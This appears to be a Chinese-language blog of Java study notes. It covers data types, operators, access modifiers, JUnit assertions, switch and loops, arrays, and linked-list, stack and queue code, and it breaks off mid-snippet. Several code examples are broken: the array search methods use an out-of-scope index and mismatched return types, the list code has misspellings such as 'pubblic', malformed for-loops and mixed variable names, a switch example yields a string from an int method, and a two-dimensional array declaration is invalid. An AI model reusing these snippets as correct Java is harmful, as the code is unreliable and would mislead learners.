程序的入口方法，运行时会从这里开始执行。 String[] args：用来接收命令行参数，比如运行时 java HelloWorld a b c，args 就是 [&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]。 String args[] 与 String[] args 都可以执行，但推荐使用 String[] args，这样可以避免歧义和误读。 System.out.println(&quot;Hello, World!&quot;);：向控制台输出 &quot;Hello, World!&quot;。 注意，一份java文件里最多只能有一个public class。 面向对象编程面向对象意味着程序通过“对象”来组织和运行。而在 Java 中，类（class）是对象的模板，描述了对象的属性和行为。 类中可以包含： 字段（field）：用来表示对象的数据。 方法（method）：用来定义对象能做的事。 例子： 1234567891011121314151617181920class Person &#123; // 字段 String name; int age; // 方法 void sayHello() &#123; System.out.println(&quot;Hello, my name is &quot; + name); &#125;&#125;// 使用类public class test &#123; public static void main(String[] args) &#123; Person p = new Person(); // 创建对象 p.name = &quot;Alice&quot;; p.age = 20; p.sayHello(); // 调用方法 &#125;&#125; 而对象有着三个核心特征： 身份： 属性可以发生变化，但身份不会。比如说名字，身份证号等。 状态： 当前所有属性的集合。比如说身高体重等。 行为： 进行会修改当前状态的操作。如吃饭，喝水等。 构造函数 是一种特殊方法，与 new 联合使用。 名字和类名相同，没有返回类型。 如果一个类里不写任何构造函数，Java 自动给你生成一个无参的“默认构造函数”。 例子： 12345678class Rational &#123; private int numerator, denominator; Rational(int z, int n) &#123; // 构造函数 numerator = z; denominator = n; &#125;&#125; 调用： 1Rational a = new Rational(3, 4); 引用/reference123Rational a = new Rational(3, 4);Rational b = a; // b 和 a 指向同一个对象 b = a; 并不是复制一份新对象，只是复制了一份引用地址，即指向同一个对象。 所以通过 b 改对象，其实就是改 a 指向的那个对象。 对象作为属性我们同样也可以将对象设置成属性。（简单来讲就是套娃，对象套对象。） 12345678910111213class Point &#123; double x, y;&#125;class Line &#123; private Point p1; private Point p2; Line(Point p, Point q) &#123; // 构造函数 p1 = p; p2 = q; &#125;&#125; 类属性privateprivate 修饰的成员是“仅在本类内部可见”的：类外代码不能直接访问，只能通过本类提供的方法间接使用。 比如说 12345678class Rational &#123; private int numerator, denominator; Rational(int z, int n) &#123; // 构造函数 numerator = z; denominator = n; &#125;&#125; 1Rational a = new Rational(3, 4); 在其他类里，不能直接通过a.numerator来访问a的分子。 尽量将所有的属性都设置成private。可以更好地保护以及管控对象内的属性。 publicprivate 修饰的成员是所有类可见。 比如说： 12345678class Rational &#123; public int numerator, denominator; Rational(int z, int n) &#123; // 构造函数 numerator = z; denominator = n; &#125;&#125; 那么所有类都可以直接调用 123Rational a = new Rational();a.numerator = 3; staticstatic修饰的成员是“类级别”的：所有对象共享一份。 例子：统计创建了多少个 Count 对象： 123456789class Count &#123; private static int count = 0; // 类属性 private int info; // 对象属性 public Count() &#123; info = count; count = count + 1; &#125;&#125; count 是整个类共享的计数器。 每次 new Count()，构造函数就把当前 count 值写到 info，然后 count++。 结果：每个对象的 info 都是一个唯一的编号 0,1,2,… 相同/相等 == 比较的是引用是否相同（是不是同一个对象）。 想比较两个对象内容是否相同（相等，identical），需要写自己的 equals 方法，比如： 123456public class Rational &#123; int zaehler, nenner; public boolean equals(Rational r) &#123; return (zaehler * r.nenner == r.zaehler * nenner); &#125;&#125; 命名Sun（Sun Microsystems, Inc.，当时发明Java语言和平台的公司）很早就给 Java 出了一份官方《Code Conventions for the Java Programming Language》，里边明确推荐： 类名：UpperCamelCase → ArrayList, StringBuilder 方法 / 变量：lowerCamelCase → loadBefore, userName 常量（static final）：ALL_CAPS_SNAKE_CASE → MAX_VALUE, DEFAULT_TIMEOUT 包名：全小写点分 → java.util, org.example.app Java 标准库全部遵守这个规范： ArrayList, HashMap, getClass(), toString(), System.out.println(), Math.max()…… 所有 API 都是驼峰风格。 基本数据类型Java语言提供了八种基本类型。六种数字类型（四个整数型，两个浮点型），一种字符类型，还有一种布尔型。 byte： byte 数据类型是8位、有符号的，以二进制补码表示的整数； 最小值是 -2^7； 最大值是 2^7-1； 默认值是 0； byte 类型用在大型数组中节约空间，主要代替整数，因为 byte 变量占用的空间只有 int 类型的四分之一； 例子：byte a = 100，byte b = -50。 short： short 数据类型是16 位、有符号的以二进制补码表示的整数 最小值是 -2^15； 最大值是 2^15 - 1； Short 数据类型也可以像 byte 那样节省空间。一个short变量是int型变量所占空间的二分之一； 默认值是 0； 例子：short s = 1000，short r = -20000。 int： int 数据类型是32位、有符号的以二进制补码表示的整数； 最小值是 -2^31； 最大值是 2^31 - 1； 一般地整型变量默认为 int 类型； 默认值是 0 ； 例子：int a = 100000, int b = -200000。 long： long 数据类型是64 位、有符号的以二进制补码表示的整数； 最小值是 -2^63； 最大值是 2^63 -1； 这种类型主要使用在需要比较大整数的系统上； 默认值是 0L； 例子： long a = 100000L，long b = -200000L。“L”理论上不分大小写，但是若写成”l”容易与数字”1”混淆，不容易分辩。所以最好大写。 float： float 数据类型是单精度、32位、符合IEEE 754标准的浮点数； float 在储存大型浮点数组的时候可节省内存空间； 默认值是 0.0f； 浮点数不能用来表示精确的值，如货币； 例子：float f1 = 234.5f。 double： double 数据类型是双精度、64 位、符合 IEEE 754 标准的浮点数； 浮点数的默认类型为 double 类型； double类型同样不能表示精确的值，如货币； 默认值是 0.0d； 例子： 12345double d1 = 7D ;double d2 = 7.; double d3 = 8.0; double d4 = 8.D; double d5 = 12.9867; 7 是一个 int 字面量，而 7D，7. 和 8.0 是 double 字面量。 boolean： boolean数据类型表示一位的信息； 只有两个取值：true 和 false； 这种类型只作为一种标志来记录 true/false 情况； 默认值： 作为字段/数组元素的话，默认值是false； 但如果是局部变量，则没有默认值，需要自己初始化。 例子：boolean one = true。 char： char 类型是一个单一的 16 位 Unicode 字符； 最小值是\\u0000（十进制等效值为 0）； 最大值是\\uffff（即为 65535）； char 数据类型可以储存任何字符； 例子：char letter = ‘A’;。 除此以外还有一个比较特殊的写法：var，会让编译器从右侧初始化表达式推断变量类型。比如说var n = 7; n 的静态类型是 int。但是无法用var初始化一个变量，即var n;是违规的。 byte、int、long、和short都可以用十进制、16进制以及8进制的方式来表示。 前缀 0 表示 8 进制，而前缀 0x 代表 16 进制, 例如： 123int decimal = 100;int octal = 0144;int hexa = 0x64; String（字符串）String 不是基本类型，是一个类，但使用方式比较特殊： 字面量：&quot;Hello World!&quot; 拼接：&quot;Hello &quot; + &quot;World&quot; 还有一个非常重要的点： 任意类型在和String做 + 时，会自动转成 String。 例： 123double x = -0.55e13;System.out.println(&quot;Eine Gleitkomma-Zahl: &quot; + x);// Eine Gleitkomma-Zahl: -5.5E12 但是这是有先后顺序的：在String之前的+运算会被当成普通的加法运算，而String之后的+会被当成字符串拼接，比如说： 12System.out.println(1 + 2 + &quot;h&quot; + 1 + 2);// 会输出3h12 即先计算了1+2=3，然后再把”3”，”h”，”1”，”2”当成了字符串拼接了起来。 转义字符Java语言支持一些特殊的转义字符序列。 符号 字符含义 \\n 换行 (0x0a) \\r 回车 (0x0d) \\f 换页符(0x0c) \\b 退格 (0x08) \\0 空字符 (0x0) \\s 空格 (0x20) \\t 制表符 \\&quot; 双引号 \\&#39; 单引号 \\\\ 反斜杠 \\ddd 八进制字符 (ddd) \\uxxxx 16进制Unicode字符 (xxxx) Operation（运算符）算术运算符 + - * / % Java 在二元数值运算里会做二进制数值提升（binary numeric promotion）： 先把比 int 小的整型（byte/short/char）都提升到 int； 再根据两个操作数中“更大的类型”统一到 long / float / double； 结果类型就是提升后的那个类型。 例子： 123int n = 2;long l = 3L;var x = n + l; n 提升为 long，结果是 long，x 推断为 long，值 5L。 123int n = 2;double d = 7.0;var x = n + d; n 提升为 double，结果是 double，x 推断为 double，值 9.0。 123short s1 = 1;short s2 = 2;short s3 = s1 + s2; 无法成功编译。s1 + s2 先都提升为 int，结果是 int，不能隐式放回 short。 正确写法：short s3 = (short)(s1 + s2); 或者 var s3 = s1 + s2; // s3 是 int 除法 /除法会分成整除和浮点除：两个 int/long 做除法得到整除（向零截断），只要有 double/float 参与就是浮点除。 1234567double d1 = 7 / 3; // 7/3 先做整除得 2，再拓宽为 2.0double d2 = 7.0 / 3; // 2.3333333333333335double d3 = 7 / 3.0; // 2.3333333333333335double d4 = 7.0 / 3.0; // 2.3333333333333335double d5 = 3 / 0.5; // 3 提升为 double =&gt; 3.0 / 0.5 = 6.0double d6 = 3 / (1/2); // (1/2) 是整除得 0，表达式变成 3/0（int）=&gt; 运行时抛出 ArithmeticException: / by zero 但假设右边的变量都是int，但我们希望左边的结果为double / float时，我们便需要在左边加上(double )/(float)来确保数据类型： 1234int x = 7, y = 3;double q0 = x/y; // 直接整除得到2 =&gt; 2.0double q1 = (double) (x / y); // 先整除得到2，再转 double =&gt; 2.0double q2 = (double) x / y; // 先把 x 变 double =&gt; 7.0/3 =&gt; 2.3333333333333335 取余（%）Java 的余数符号与左操作数（被除数）相同，并满足：a == (a/b)*b + (a%b)（这里的 / 仍是向零截断）。 1234567891011int v1 = 11 % 4; // 3int v2 = 0 % 4; // 0int v3 = 4 % 0; // 运行时 ArithmeticException: / by zeroint v4 = -11 % 4; // -3 （-11/4 == -2，余数 r = -11 - (-2)*4 = -3）int v5 = 11 % -4; // 3int v6 = -11 % -4; // -3double v7 = 3.5 % 2; // 1.5double v8 = 3.5 % 2.5; // 1.0double v9 = (22/7) % (19/7); // (22/7)==3，(19/7)==2，3%2==1 =&gt; 1.0 自增/自减（++/--）前缀：先改值后取值；后缀：先取值后改值。 12345678910int n = 5;--n; // n = 4int k = n++ - --n; // 左: n++ 返回 4，n=&gt;5；右: --n 先减到 4 返回 4；k=4-4=0；此后 n=4int l = ++n + n--; // ++n: 5；n--: 先用 5 再变 4；l=5+5=10；n=4n = n--; // 右边返回 4，再把 n 减到 3，然后赋回左边 n=4（“自减的结果值”被赋回）System.out.println(&quot;k = &quot; + k); // 0System.out.println(&quot;l = &quot; + l); // 10System.out.println(&quot;n = &quot; + n); // 4 但是注意，有一个容易出错的点是： 1234int a = 0;a = a++;System.out.println(a);// 会输出0。 因为a = a++;相当于给a重新又赋值成了0，没有++的机会。 123456789double d = 3.14;char c = &#x27;L&#x27;;int n1 = (int) d--; // 先取 3.14 再 d=2.14；(int)3.14==3int n2 = ++c; // &#x27;L&#x27;-&gt;&#x27;M&#x27;（77），表达式值是 &#x27;M&#x27;，赋给 int 得 77System.out.println(&quot;d = &quot; + d); // 2.14System.out.println(&quot;c = &quot; + c); // MSystem.out.println(&quot;n1 = &quot; + n1); // 3System.out.println(&quot;n2 = &quot; + n2); // 77 比较运算符基本值比较 12345boolean b1 = 4 == 4.0; // true（4 提升为 4.0）boolean b2 = 7L == (short) 5; // false（7 != 5）boolean b3 = true == 1; // **不通过编译**（boolean 不能与整型用 == 比较）boolean b4 = &#x27;d&#x27; == 100; // true（&#x27;d&#x27; 的码位是 100）boolean b5 = false == b4; // false == true -&gt; false 引用比较（对象） 1234567891011121314151617class A &#123; private int n; public A(int n) &#123; this.n = n; &#125; public int getN() &#123; return n; &#125; public void setN(int n) &#123; this.n = n; &#125;&#125;A a1 = new A(2);A a2 = new A(3); a2.setN(2);A a3 = new A(3 - 1); // 2A a4 = new A(2);A a5 = a1;System.out.println(a1 == a2); // false（不同对象）System.out.println(a1 == a3); // falseSystem.out.println(a1 == a4); // falseSystem.out.println(a1 == a5); // true（同一引用） == 比较的是引用是否同一对象，不是内容。若想按内容比较，应覆写 equals。 字符串相等性 123456789101112131415String s1 = &quot;abc&quot;;String s2 = &quot;abc&quot;;String s3 = &quot;a&quot; + &quot;b&quot; + &quot;c&quot;; // 编译期常量折叠，指向同一常量池对象String s4 = new String(&quot;abc&quot;); // 显式新建对象String s5 = s1 + &quot;&quot;; // 运行期拼接，通常新对象System.out.println(&quot;s1 == s2: &quot; + (s1 == s2)); // trueSystem.out.println(&quot;s1 == s3: &quot; + (s1 == s3)); // trueSystem.out.println(&quot;s1 == s4: &quot; + (s1 == s4)); // falseSystem.out.println(&quot;s1 == s5: &quot; + (s1 == s5)); // false（几乎总是）System.out.println(&quot;s1.equals(s2): &quot; + s1.equals(s2)); // trueSystem.out.println(&quot;s1.equals(s3): &quot; + s1.equals(s3)); // trueSystem.out.println(&quot;s1.equals(s4): &quot; + s1.equals(s4)); // trueSystem.out.println(&quot;s1.equals(s5): &quot; + s1.equals(s5)); // true 结论：比较字符串内容用 equals，不要用 ==。 浮点比较陷阱 12double d = Math.sqrt(2) * Math.sqrt(2);System.out.println(d == 2.0); // 往往是 false（浮点误差） 解决：用误差容忍（epsilon）： 1boolean close = Math.abs(d - 2.0) &lt; 1e-10; 逻辑运算符真值表 |（逻辑或，不短路）： false|false =&gt; false false|true =&gt; true true |false =&gt; true true |true =&gt; true ^（逻辑异或，不短路）：两边不同为 true false^false =&gt; false false^true =&gt; true true ^false =&gt; true true ^true =&gt; false （补充：&amp;、| 有布尔版（不短路）与按位版；&amp;&amp;、|| 是短路逻辑。） 短路与副作用 1234567891011int n1 = 7;boolean b1 = n1 &lt; 4 &amp; ++n1 % 2 == 0; // &amp; 不短路：右侧必评估，n1 变 8// 左假右真 =&gt; b1=false，n1==8int n2 = 7;boolean b2 = n2 &lt; 4 &amp;&amp; ++n2 % 2 == 0; // &amp;&amp; 短路：左边已为假，右侧不评估，n2 仍 7System.out.println(&quot;n1 == &quot; + n1); // 8System.out.println(&quot;b1 == &quot; + b1); // falseSystem.out.println(&quot;n2 == &quot; + n2); // 7System.out.println(&quot;b2 == &quot; + b2); // false 赋值运算符与结合性所有赋值运算符（=、+=、-=、...）都是右结合：从右往左算。+= 等复合赋值在需要时会隐式强制类型转换（先算出右值，再转换为左侧变量类型）。 1234567int n1 = 1, n2 = 2, n3 = 3;n1 = n2 = n3 = 4;// 等价于：n3=4; n2=n3; n1=n2;// n1 == 4// n2 == 4// n3 == 4 1234567int n1 = 1, n2 = 2, n3 = 3;n1 += n2 += n3 += 4;// 步骤：n3=3+4=7; n2=2+7=9; n1=1+9=10;// n1 == 10// n2 == 9// n3 == 7 12int n1 = 1, n2 = 2, n3 = 3;n1 += n2 + n3 = 4; // **不通过编译** 原因：n2 + n3 不是变量，不能作为赋值左值。 1234567int n1 = 1, n2 = 2, n3 = 3;n1 += n2 = n3 + 4; // **可以编译**（赋值表达式有值）// 右结合：n2 = 3+4 =&gt; 7；然后 n1 += 7 =&gt; 8；n3 保持 3。// n1 == 8// n2 == 7// n3 == 3 修饰符Java语言提供了很多修饰符，主要分为以下两类： 访问修饰符 非访问修饰符 修饰符用来定义类、方法或者变量，通常放在语句的最前端。我们通过下面的例子来说明： 123456789public class ClassName &#123; // ...&#125;private boolean myFlag;static final double weeks = 9.5;protected static final int BOXWIDTH = 42;public static void main(String[] arguments) &#123; // 方法体&#125; 访问控制修饰符Java中，可以使用访问控制符来保护对类、变量、方法和构造方法的访问。Java 支持 4 种不同的访问权限。 default (即默认，什么也不写）: 在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。 private : 在同一类内可见。使用对象：变量、方法。 注意：不能修饰类（外部类） public : 对所有类可见。使用对象：类、接口、变量、方法 protected : 对同一包内的类和所有子类可见。使用对象：变量、方法。 注意：不能修饰类（外部类）。 访问控制： 修饰符 当前类 同一包内 子孙类(同一包) 子孙类(不同包) 其他包 public Y Y Y Y Y protected Y Y Y Y/N N default Y Y Y N N private Y N N N N 注释单行注释： 123// 注释/* 注释 */ 多行注释： 多行注释以 /*开始，以*/结束： 1234/* 多行注释*/ 文档注释:文档注释以 /** 开始，以 */ 结束 1234/** * 这是一个文档注释示例 * 它通常包含有关类、方法或字段的详细信息 */ 测试JUnit5是Java领域里标准单元测试框架。 import： 1234import org.junit.jupiter.api.Test;import org.junit.jupiter.api.BeforeEach;import org.junit.jupiter.api.AfterEach;import static org.junit.jupiter.api.Assertions.*; 先来看一个简单的例子： 1234@Testpublic void exampleTest() &#123; assertEquals(42, 42);&#125; @Test是一个 注解（annotation），来自 JUnit（比如 org.junit.Test）。它告诉测试框架：“下面这个方法是一个测试用例，请在执行测试时自动运行它”。 只要点 IDE 里的 “Run Tests”，测试框架就会扫描所有带 @Test 的方法，然后一个个执行。 常用注解包括： @Test： 标记一个方法为单元测试方法。 @BeforeEach： 前置设置。在每个测试方法运行之前执行一次，用于初始化数据或环境。 @AfterEach： 后置清理。在每个测试方法运行之后执行一次，用于清理资源。 @ParameterizedTest： 参数化测试。允许使用不同的输入数据多次运行同一个测试方法，减少重复代码。 assertEquals(42, 42);是一个断言 (Assertions)，是测试的核心。它用来验证实际运行结果是否符合预期。 常用断言包括： 相等性与不等性断言 (Equality) assertEquals(expected, actual)： 断言期望值与实际值相等（比较内容/值）。 assertNotEquals(unexpected, actual)： 断言实际值与给定的值不相等。 assertArrayEquals(expected, actual)： 断言两个数组包含相同的元素序列且顺序一致。 真值断言 (Boolean Conditions) assertTrue(condition)： 断言给定的布尔条件为 真 (true)。 assertFalse(condition)： 断言给定的布尔条件为 假 (false)。 空值断言 (Nullity) assertNull(actual)： 断言实际值为 空 (null)。 assertNotNull(actual)： 断言实际值 非空。 对象身份断言 (Identity / Same Reference) assertSame(expected, actual)： 断言期望对象和实际对象是同一个对象实例（即引用相等）。 assertNotSame(unexpected, actual)： 断言两个对象不是同一个对象实例。 异常与行为断言 (Exceptions and Behavior) assertThrows(Type, executable)： 断言在执行可执行代码时，会抛出指定类型的异常。 assertDoesNotThrow(executable)： 断言在执行代码时，不会抛出任何异常。 assertTimeout(duration, executable)： 断言代码块在指定的时间内执行完毕（非抢占式）。 assertTimeoutPreemptively(duration, executable)： 断言代码块在指定时间后立即被中止（抢占式）。 组合与失败断言 (Grouping and Failure) assertAll(executables...)： 组合断言。即使前面的断言失败，也会继续执行所有断言，然后统一报告所有失败。 fail(message)： 强制使当前测试方法失败，并带有一个可选的消息。 除此以外，Java 测试方法通常有几个特点： 必须是 public 这样测试框架可以通过反射来调用这个方法。 返回类型是 void 测试的“结果”不是通过返回值表示的，而是： 不抛异常 → 视为测试通过 抛出断言异常（AssertionError）或其他异常 → 视为测试失败 控制结构控制结构一般分为3种： 顺序结构 选择结构 迭代结构 任何可计算的函数都可以通过顺序、选择和迭代这三种结构计算出来（图灵完备性） 。 选择结构if / else12345678int score = 85;if (score &gt;= 90) &#123; System.out.println(&quot;A&quot;);&#125; else if (score &gt;= 80) &#123; System.out.println(&quot;B&quot;);&#125; else &#123; System.out.println(&quot;C&quot;);&#125; 三元运算符 ? :12int x_abs = x &gt;= 0 ? x : -x;// 计算绝对值 如果问号?前面的条件满足，则走冒号:前的分支，反之则走冒号:后面的分支。 switch（适合离散值分支）最基础的写法，使用冒号 : 来标记分支。 使用 case 值: 来定义入口。 必须使用 break;：执行完代码后，必须显式调用 break 语句来跳出 switch 块 。 穿透现象 (Fall-through)：如果忘记写 break，程序会继续向下执行下一个 case 的代码，这通常会导致逻辑错误（但也可能被故意利用） 。 123456789switch (monat) &#123; case 1: tage = 31; break; // 必须有 break case 2: tage = 28; break; // ...&#125; 而在Java 14中引入了一种新的改进写法（非常好用）： 使用 case 值 -&gt; 语句; 的形式。 无需 break：执行完箭头后的语句会自动跳出 switch，不会发生穿透，避免了传统写法中最容易出现的错误 。 支持多值匹配：可以在一个 case 中用逗号分隔多个值，例如 case 1, 3, 5 -&gt; ... 。 例子： 12345678910111213141516int tageImMonat(int monat) &#123; int tage = 0; switch (monat) &#123; case 1, 3, 5, 7, 8, 10, 12 -&gt; tage = 31; case 2 -&gt; tage = 28; case 4, 6, 9, 11 -&gt; tage = 30; default -&gt; &#123; System.out.println(&quot;Der &quot; + month + &quot;. ist kein gültiger Monat!&quot;); yield &quot;ERROR&quot;; &#125; &#125; return tage;&#125; switch 不仅可以执行动作，还可以直接返回值（作为表达式赋值给变量） 。 写法 A（使用箭头）： 直接返回箭头后的值。 12345String season = switch (month) &#123; case 12, 1, 2 -&gt; &quot;winter&quot;; case 3, 4, 5 -&gt; &quot;spring&quot;; // ...&#125;; 写法 B（使用冒号 + yield）： 如果在表达式中仍使用传统的冒号写法（例如为了执行代码块），则必须使用 yield 关键字来返回值 。 12345String season = switch (month) &#123; case 12, 1, 2: yield &quot;Winter&quot;; // 使用 yield 返回 // ...&#125;; 迭代结构for123for (int i = 0; i &lt; n; i++) &#123; System.out.println(i);&#125; 这种写法i会遍历[0,n)的所有数。 如果需要遍历时也需要考虑n的情况，可以写成 123for (int i = 0; i &lt;= n; i++) &#123; System.out.println(i);&#125; 会比较直观。 注意，循环的每一轮的执行顺序是这样的： 先判断条件： i &lt; n 条件为真就执行循环体：System.out.println(i); 然后再执行更新表达式：i++ 回到 1) 1234int[] arr = &#123;1,2,3&#125;; //定义数组for (int v : arr) &#123; System.out.println(v);&#125; while12345int i = 3;while (i &gt; 0) &#123; System.out.println(i); i--;&#125; 先判断条件，若为真则执行循环体，执行完后再次判断；若为假则跳过 。 可以用break来退出当前循环 也可以用continue跳过当前循环的剩余部分并直接开始下一轮循环 do-while1234int x = 0;do &#123; System.out.println(&quot;执行一次&quot;);&#125; while (x &gt; 0); 至少执行一次循环体，因为条件检查在末尾 。 数组 Array基础定义： 数组将同类型数据连续存储，通过索引（Index）访问，索引从0开始 。 声明/创建/初始化： 12345678// 声明type [] name;type name [];// 创建/初始化new type [n];type [] name = &#123;...&#125; 例子： 12345int [] vector;int [] vector = &#123;1,2,3,4&#125;a = new int[6]; 引用语义： 数组变量（如 a）存储的不是数组本身，而是一个指向数组的引用（Reference） 。 别名现象 (Aliasing)： 执行 int[] b = a; 后，b 和 a 指向同一个内存地址。修改 b[i] 会导致 a[i] 也发生变化 。 操作长度： name.length 获取数组元素个数 。 例子： 12int [] vector = &#123;1,2,3,4&#125;;// vector.length = 4 越界： 访问范围之外的索引会触发 ArrayIndexOutOfBoundsException 。 遍历 (Iteration)： 通常写法： 123for (int i = 0; i &lt; a.length ; i++)&#123; a[i]...;&#125; 123for(int i: a)&#123;&#125; 也可以用while： 12345int i = 1;while(i &lt; a.length)&#123; a[i]...; i++;&#125; 遍历数组的值： 1234int idx = 0;for (int value : a) &#123; b[idx++] = value;&#125; 数组复制： 直接赋值 (b=a) 只是复制引用。 若要深拷贝（真正复制内容），必须创建一个新数组并循环赋值 b[i] = a[i] 。 也可以使用 java.lang.System.arraycopy(...) 。 12345int [] a = &#123;1,2,3,4&#125;;int b [] = new int[4];for (int i=0 ; i &lt; a.length ; i++)&#123; b[i] = a[i];&#125; 例子查找元素查找是否存在 12345678boolean has (long[a], long x)&#123; for (int i=0; i&lt;a.length;i++)&#123; if (a[i]==x)&#123; break; &#125; &#125; return i != a.length;&#125; 如果存在，查找index： 12345678boolean has (long[a], long x)&#123; for (int i=0; i&lt;a.length;i++)&#123; if (a[i]==x)&#123; break; &#125; &#125; return i;&#125; 排序Bubble Sort： 123456789101112public static void bubbleSort(int[] fish) &#123; int zwischen; for(int round = 0; round &lt; fish.length ; round++)&#123; for (int i=0; i &lt; fish.length-1 - round ; i++)&#123; if (fish[i] &gt; fish[i+1])&#123; zwischen = fish[i]; fish[i] = fish[i+1]; fish[i+1] = zwischen; &#125; &#125; &#125; &#125; 多维数组java仅直接支持一维数组。二维数组实际上是元素维数组的一个数组。 1new int[][] twoDimArray; 1234A = new int [n][m] A.length // = nA[0].length // = m 当然，二维数组不一定每行的长度都是一样的，比如说 1new int[][] &#123;&#123;1, 3&#125;, &#123;25&#125;, &#123;7, 4, 6, 9&#125;&#125; 也是合法的。 例子（向量加法）： （假设a，b的长度一样且不等于0） 1234567public static int[] addVector(int[] a, int[] b)&#123; int [] c = new int[a.length]; for (int i=0; i&lt;a.length;i++)&#123; c[i] = a[i]+b[i]; &#125; return c;&#125; 例子（点积）： （假设a，b的长度一样且不等于0） 1234567public static int scalarProduct(int [] a, int [] b)&#123; int result = 0; for (int i=0; i&lt;a.length;i++)&#123; result += a[i]*b[i]; &#125; return result;&#125; 例子（矩阵乘法）： 123456789101112131415161718192021222324252627282930313233343536public static int[][] matrixMult(int[][] matrixA, int[][] matrixB) &#123; // 先检查输入是否合规 int aRow = matrixA.length; int bRow = matrixB.length; int aCol = matrixA[0].length; int bCol = matrixB[0].length; if (aCol != bRow)&#123; return null; &#125; for (int idx = 0; idx &lt; aRow ; idx++)&#123; if (aCol != matrixA[idx].length)&#123; return null; &#125; &#125; for (int idx = 0; idx &lt; bRow ; idx++)&#123; if (bCol != matrixB[idx].length)&#123; return null; &#125; &#125; // 真正开始计算 int[][] result = new int[aRow][bCol]; for (int i=0; i &lt; aRow ; i++)&#123; for (int j = 0; j &lt; bCol ; j++)&#123; for (int k=0 ; k &lt; aCol ; k++)&#123; result[i][j] += matrixA[i][k] * matrixB[k][j]; &#125; &#125; &#125; return result;&#125; 数据结构链表构造函数： 12345678910111213public class List&#123; public int info; public List next; public List(int x, List l)&#123; info = x; next = l; &#125; public List(int x)&#123; info = x; next = null; &#125;&#125; 插入（将新元素插入到当前元素的后面）： 123public void insert (int x)&#123; next = new List(x,next);&#125; 相当于可以拆成2步： new List(x,next);：新创建一个List元素，并将其next指针的内容设置为当前位置的next指针里的内容，然后 next =：将当前的next指针修改成指向这个新创建的List元素的指针 删除（下一个元素）： 12345public void delete ()&#123; if (next != null)&#123; next = next.next; &#125;&#125; toString： 1234567891011121314151617pubblic String toString ()&#123; String result = &quot;[&quot; + info; for List t = next; t != null ; t=t.next)&#123; result = result + &quot;, &quot; + t.info; &#125; return result + &quot;]&quot;;&#125;public static String toString (List l)&#123; if (l == null)&#123; return &quot;[]&quot;; &#125; else &#123; return l.toString(); &#125;&#125; 判断是否为空： 12345678public static boolean isEmpty (List l)&#123; if (l == null)&#123; return true; &#125; else&#123; return false &#125;&#125; 计算长度： 1234567private int length()&#123; int result = 1; for (List t=next, t!=null; t=t.next)&#123; result++; &#125; return result;&#125; （与数组之间的）转换： 1234567891011121314151617181920212223public static List arrayToList (int [] a)&#123; // 从后往前构造链表 List result = null; if (a != null)&#123; for (int t=a.length-1; i &gt;= 0; i--)&#123; result = new List(a[i], result); &#125; &#125; return result;&#125;public int[] ListToArray()&#123; // 从前往后遍历 List t = this; int n = length(); int[] a = new int[n]; for (int i=0; i&lt;n; i++)&#123; a[i] = t.info; t = t.next; &#125; return a;&#125; Mergesort1234567891011121314151617181920212223242526public static List merge (List a, List b) &#123; List result = new List(0); // 创建一个虚拟的头节点 (Dummy node) List t = result; // t 指向当前结果链表的末尾 while (true) &#123; if (a == null) &#123; // 如果列表 a 结束了 t.next = b; // 将列表 b 剩余部分全部接上 break; &#125; if (b == null) &#123; // 如果列表 b 结束了 t.next = a; // 将列表 a 剩余部分全部接上 break; &#125; // 比较两个列表的当前元素，将较小的那个接在结果链表 t 的后面 if (b.info &gt; a.info) &#123; t = t.next = a; // t.next 指向 a，然后 t 移动到 a a = a.next; // a 指针后移 &#125; else &#123; t = t.next = b; // t.next 指向 b，然后 t 移动到 b b = b.next; // b 指针后移 &#125; &#125; // end of while return result.next; // 丢弃虚拟的头节点并返回结果链表&#125; // end of merge 栈/Stack （Last In First Out）1. 实现思路一：使用链表 (List) 12345678910111213141516171819202122232425262728293031323334public class Stack &#123; // 使用 List 作为底层数据结构 private List l; // 构造函数：创建空栈 public Stack() &#123; l = null; &#125; // 检测是否为空栈 public boolean isEmpty() &#123; return l == null; &#125; // 弹出栈顶元素（Pop） public int pop() &#123; // 假设 l != null int result = l.info; l = l.next; // l 指针移向下一个元素，原栈顶元素被移除 return result; &#125; // 压入元素（Push） public void push(int a) &#123; // 使用 List 的构造函数，头插新元素 a l = new List(a, l); &#125; // 转换为字符串 public String toString() &#123; return List.toString(l); &#125; &#125; 2. 实现思路二：使用动态数组 (int[]) 123456789101112131415161718192021222324252627282930313233343536373839public class Stack &#123; private int sp; // 栈指针 (Stack Pointer)，指向栈顶元素 private int[] a; // 底层数组 // 构造函数：初始化栈指针，创建初始大小为 4 的数组 public Stack() &#123; sp = -1; a = new int[4]; &#125; // 检测是否为空栈 public boolean isEmpty() &#123; return (sp &lt; 0); &#125; public void push(int x) &#123; sp++; // 栈指针先移动 // 检查数组是否已满 if (sp == a.length) &#123; int[] b = new int[2 * sp]; // 创建两倍大小的新数组 // 复制元素 for (int i = 0; i &lt; sp; i++)&#123; b[i] = a[i]; &#125; a = b; // 将引用指向新数组 &#125; a[sp] = x; // 将新元素存入栈顶位置 &#125; public int pop() &#123; // 假设 sp &gt; -1 return a[sp--]; // 返回当前栈顶元素，然后 sp 递减 &#125;&#125; pop的优化版本： 12345678910111213141516171819public int pop() &#123; // 假设: sp &gt; -1 int result = a[sp]; // 先取出栈顶元素 // 检查是否满足收缩条件：栈指针达到数组长度的四分之一，并且数组至少有2个元素 if (sp == a.length/4 &amp;&amp; sp &gt;= 2) &#123; // [cite: 2588] // 缩容逻辑：创建当前大小一半的新数组 (2*sp) int[] b = new int[2*sp]; // [cite: 2588] // 复制元素 for(int i=0; i &lt; sp; i++) b[i] = a[i]; // [cite: 2589] a = b; // 将数组引用指向新数组 [cite: 2590] &#125; sp--; // 栈指针递减 return result; // 返回结果&#125; Queue（First In First Out）1. 实现思路一：使用链表 (List) 使用两个指针 first（队首）和 last（队尾）来维护队列。 123456789101112131415public class Queue &#123; private List first, last; // [cite: 2645] // 构造函数：创建空队列 public Queue () &#123; first = last = null; // [cite: 2646-2648] &#125; // 检测是否为空队列 public boolean isEmpty() &#123; return first == null; // [cite: 2650] &#125; // ...&#125; 操作： 1234567891011121314151617181920212223242526// 出队元素（Dequeue）public int dequeue () &#123; // 假设 first != null int result = first.info; // 取出队首元素的值 [cite: 2658] if (last == first) // 检查是否只剩一个元素 [cite: 2658] last = null; // 如果是，队尾也置为 null [cite: 2658] first = first.next; // 队首指针后移 [cite: 2658] return result; // [cite: 2659]&#125;// 入队元素（Enqueue）public void enqueue (int x) &#123; if (first == null) &#123; // 如果队列为空 first = 